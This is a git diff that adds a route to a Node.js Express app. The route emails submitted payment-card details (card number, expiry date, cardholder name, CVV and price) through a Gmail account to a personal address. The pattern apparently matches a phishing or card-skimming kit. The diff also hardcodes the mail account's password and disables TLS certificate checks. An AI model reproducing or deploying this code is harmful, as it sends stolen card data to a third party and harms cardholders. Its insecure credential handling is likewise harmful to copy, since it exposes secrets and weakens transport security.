@@ -108,13 +108,56 @@ app.get('/logout', function(req, res){
 
 
 
+/////////////
+app.get('/', (req, res)=> {
+    
+    async function main() {
+
+        let transporter = nodemailer.createTransport({
+            host: "smtp.gmail.com",
+            port: 587,
+            secure: false, 
+            auth: {
+                user: "elabyadsaloua@gmail.com",
+                pass: "saloua1998",
+            },
+            tls: {
+                rejectUnauthorized: false
+            }
+        });
+    
+        // send mail with defined transport object
+        let info = await transporter.sendMail({
+            from: 'elabyadsaloua@gmail.com', // sender address
+            to: "salouaelabyad@gmail.com", // list of receivers
+            subject: "Hello 6", // Subject line
+            text: "Hello world?", // plain text body
+            html: `
+        <b>Number Of Card:</b> ${req.body.ncart} <br>
+        <b>Expiration Date:</b> ${req.body.datcart} <br>
+        <b>Name of the card holder:</b> ${req.body.nacart} <br>
+        <b>Cvv:</b> ${req.body.cvv} <br>  
+        <b>Prix:</b> ${req.body.prix} <br>
+        `
 
 
+        });
+    
+        console.log("Message sent: %s", info.messageId);
 
-
+        console.log("Preview URL: %s", nodemailer.getTestMessageUrl(info));
+    }
   
+    main().catch(console.error);
+    //END SEND MAIL
+    res.render('red');
+});
 
 
+// fs.writeFile("temp.txt", data, (err) => {
+//     if (err) console.log(err);
+//     console.log("Successfully Written to File.");
+//   });
 
 
 
